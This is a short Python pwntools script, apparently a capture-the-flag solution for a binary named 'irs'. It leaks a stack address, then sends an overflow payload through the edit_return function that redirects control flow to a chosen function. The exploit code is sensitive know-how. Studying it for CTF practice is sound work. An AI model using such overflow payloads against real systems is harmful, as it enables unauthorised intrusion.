#!/usr/bin/env python3
from pwn import *

NEW_RETURN = '1'
EDIT_RETURN = '3'
EDIT_BUFFER = 0x15
VIEW_FUNC = p32(0x804892c)

#r = remote('irs.pwn.republican', 4127)
r = process('./irs')

# create 5 returns
for i in range(5):
    r.recvuntil('today?\r\n')
    r.sendline(NEW_RETURN)
    r.send('dan{}\r\nlol\r\n10\r\n10\r\n'.format(i))

# attempt a 6th, get the stack address
r.sendline(NEW_RETURN)
r.recvuntil('address: ')
namelist = p32(int(r.recvline().rstrip()[2:], 16))

# buffer overflow at the end of edit_return function
r.sendline(EDIT_RETURN)
r.send('dan0\r\nlol\r\n7\r\n7\r\n')
r.recvuntil('y/n\r\n'), 'utf-8'
r.sendline(b'A' * (EDIT_BUFFER + 4) + VIEW_FUNC + b'AAAA' + namelist + b'\x00\x00\x00\x00')
print(r.recvall().decode('utf-8'))
